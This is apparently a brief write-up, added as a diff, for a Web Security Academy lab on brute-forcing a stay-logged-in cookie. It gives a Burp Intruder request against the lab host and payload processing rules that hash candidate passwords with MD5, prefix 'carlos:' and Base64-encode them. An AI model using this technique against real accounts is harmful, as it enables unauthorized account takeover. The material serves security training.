@@ -1,0 +1,27 @@
+Brute-forcing a stay-logged-in cookie
+
+The solution provided is fantastic and there's nothing really more to add.
+
+Intruder request used:
+
+GET / HTTP/1.1
+Host: ac881f5a1f800a0c80c648c90025008d.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac881f5a1f800a0c80c648c90025008d.web-security-academy.net/
+Cookie: session=urCFCtbV5XDwYcBNkGTWvsSUqL3XtRvn; stay-logged-in=§§
+Upgrade-Insecure-Requests: 1
+
+
+
+Payload processing options:
+true	Hash: MD5
+true	Add Prefix: carlos:
+true	Base64-encode
+
+Grep - Match 
+My account
+
